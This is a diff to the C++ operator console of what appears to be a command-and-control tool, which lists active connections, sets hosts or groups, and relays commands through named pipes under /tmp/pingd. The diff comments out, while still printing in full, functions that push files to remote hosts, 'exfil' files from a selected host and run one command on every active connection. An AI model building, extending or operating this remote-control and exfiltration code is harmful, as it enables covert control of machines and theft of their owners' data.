@@ -37,13 +37,12 @@ static std::string cur_group;
 
 void cmd_help(const std::string &);
 void cmd_list(const std::string &);
-void cmd_hosts(const std::string &);
 void cmd_group(const std::string &);
 void cmd_set(const std::string &);
 void cmd_run(const std::string &);
-void cmd_file(const std::string &);
-void cmd_exfil(const std::string &);
-void cmd_runall(const std::string &);
+// void cmd_file(const std::string &);
+// void cmd_exfil(const std::string &);
+// void cmd_runall(const std::string &);
 void cmd_clear(const std::string &);
 void cmd_exit(const std::string &);
 
@@ -63,7 +62,7 @@ static const std::map<std::string, command_t> commands = {
   // { "exfil", { cmd_exfil,
   //              "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
   //              "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
-  { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
+  // { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
   { "clear", { cmd_clear, "clear: clear the active connections. Useful for testing if connections still exist." } },
   { "exit", { cmd_exit, "exit: stops the server and exits" } },
 };
@@ -97,12 +96,12 @@ void cmd_help(const std::string &input)
 void cmd_list(const std::string &)
 {
   int in_pipefd, out_pipefd;
-  if ((in_pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+  if ((in_pipefd = open("/tmp/pingd/in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
 
-  if ((out_pipefd = open("/tmp/pingd_out", O_RDONLY)) == -1) {
+  if ((out_pipefd = open("/tmp/pingd/out", O_RDONLY)) == -1) {
     perror("open()");
     return;
   }
@@ -246,7 +245,7 @@ void cmd_run(const std::string &input)
   }
 
   int pipefd;
-  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+  if ((pipefd = open("/tmp/pingd/in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
@@ -293,150 +292,150 @@ void cmd_run(const std::string &input)
   close(pipefd);
 }
 
-void cmd_file(const std::string &input)
-{
-  auto input_arr = split_input(input);
+// void cmd_file(const std::string &input)
+// {
+//   auto input_arr = split_input(input);
 
-  if (input_arr.size() < 3) {
-    std::puts("usage: file [src] [dst]");
-    return;
-  }
+//   if (input_arr.size() < 3) {
+//     std::puts("usage: file [src] [dst]");
+//     return;
+//   }
 
-  int pipefd;
-  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
-    perror("open()");
-    return;
-  }
+//   int pipefd;
+//   if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+//     perror("open()");
+//     return;
+//   }
 
-  if (!cur_host.empty()) {
-    std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-              << cur_host
-              << "\n";
+//   if (!cur_host.empty()) {
+//     std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+//               << cur_host
+//               << "\n";
 
-    std::filesystem::path p = input_arr.at(1);
+//     std::filesystem::path p = input_arr.at(1);
 
-    std::stringstream sstream;
-    sstream << "send_file "
-            << cur_host
-            << " "
-            << std::filesystem::absolute(p)
-            << " "
-            << input_arr.at(2);
+//     std::stringstream sstream;
+//     sstream << "send_file "
+//             << cur_host
+//             << " "
+//             << std::filesystem::absolute(p)
+//             << " "
+//             << input_arr.at(2);
 
-    long nbytes;
-    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
-      perror("write()");
-    }
-  } else if (!cur_group.empty()) {
-    auto &group = groups.at(cur_group);
-    for (auto &host : group) {
-      if (active_connections.find(host) == active_connections.end()) {
-        continue;
-      }
-      std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-                << host
-                << "\n";
+//     long nbytes;
+//     if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
+//       perror("write()");
+//     }
+//   } else if (!cur_group.empty()) {
+//     auto &group = groups.at(cur_group);
+//     for (auto &host : group) {
+//       if (active_connections.find(host) == active_connections.end()) {
+//         continue;
+//       }
+//       std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+//                 << host
+//                 << "\n";
 
-      std::filesystem::path p = input_arr.at(1);
+//       std::filesystem::path p = input_arr.at(1);
 
-      std::stringstream sstream;
-      sstream << "send_file "
-              << host
-              << " "
-              << std::filesystem::absolute(p)
-              << " "
-              << input_arr.at(2);
+//       std::stringstream sstream;
+//       sstream << "send_file "
+//               << host
+//               << " "
+//               << std::filesystem::absolute(p)
+//               << " "
+//               << input_arr.at(2);
 
-      long nbytes;
-      if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
-        perror("write()");
-      }
-    }
-  } else {
-    std::puts("no group or host selected!");
-  }
-  close(pipefd);
-}
+//       long nbytes;
+//       if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
+//         perror("write()");
+//       }
+//     }
+//   } else {
+//     std::puts("no group or host selected!");
+//   }
+//   close(pipefd);
+// }
 
-void cmd_exfil(const std::string &input)
-{
-  auto input_arr = split_input(input);
+// void cmd_exfil(const std::string &input)
+// {
+//   auto input_arr = split_input(input);
 
-  if (input_arr.size() < 3) {
-    std::puts("usage: exfil [src] [dst]");
-    return;
-  }
+//   if (input_arr.size() < 3) {
+//     std::puts("usage: exfil [src] [dst]");
+//     return;
+//   }
 
-  if (cur_host.empty()) {
-    std::puts("no host selected!");
-    return;
-  }
+//   if (cur_host.empty()) {
+//     std::puts("no host selected!");
+//     return;
+//   }
 
-  int pipefd;
-  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
-    perror("open()");
-    return;
-  }
+//   int pipefd;
+//   if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+//     perror("open()");
+//     return;
+//   }
 
-  std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-            << cur_host
-            << "\n";
+//   std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
+//             << cur_host
+//             << "\n";
 
-  std::filesystem::path p = input_arr.at(2);
+//   std::filesystem::path p = input_arr.at(2);
 
-  std::stringstream sstream;
-  sstream << "recv_file "
-          << cur_host
-          << " "
-          << input_arr.at(1)
-          << " "
-          << std::filesystem::absolute(p);
+//   std::stringstream sstream;
+//   sstream << "recv_file "
+//           << cur_host
+//           << " "
+//           << input_arr.at(1)
+//           << " "
+//           << std::filesystem::absolute(p);
 
-  long nbytes;
-  if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
-    perror("write()");
-  }
+//   long nbytes;
+//   if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
+//     perror("write()");
+//   }
 
-  close(pipefd);
-}
+//   close(pipefd);
+// }
 
-void cmd_runall(const std::string &input)
-{
-  auto input_arr = split_input(input);
+// void cmd_runall(const std::string &input)
+// {
+//   auto input_arr = split_input(input);
 
-  if (input_arr.size() < 2) {
-    std::puts("usage: runall [command]");
-    return;
-  }
+//   if (input_arr.size() < 2) {
+//     std::puts("usage: runall [command]");
+//     return;
+//   }
 
-  int pipefd;
-  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
-    perror("open()");
-    return;
-  }
+//   int pipefd;
+//   if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+//     perror("open()");
+//     return;
+//   }
 
-  std::string command;
-  for (int i = 1; i < input_arr.size(); i++) {
-    command.append(input_arr.at(i));
-    if (i != input_arr.size() - 1) {
-      command.append(" ");
-    }
-  }
+//   std::string command;
+//   for (int i = 1; i < input_arr.size(); i++) {
+//     command.append(input_arr.at(i));
+//     if (i != input_arr.size() - 1) {
+//       command.append(" ");
+//     }
+//   }
 
-  for (auto &host : active_connections) {
-    std::stringstream sstream;
-    sstream << "send_command "
-            << host
-            << " "
-            << command;
+//   for (auto &host : active_connections) {
+//     std::stringstream sstream;
+//     sstream << "send_command "
+//             << host
+//             << " "
+//             << command;
 
-    long nbytes;
-    if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
-      perror("write()");
-    }
-  }
-  close(pipefd);
-}
+//     long nbytes;
+//     if ((nbytes = write(pipefd, sstream.str().c_str(), sstream.str().size())) == -1) {
+//       perror("write()");
+//     }
+//   }
+//   close(pipefd);
+// }
 
 void cmd_clear(const std::string &)
 {
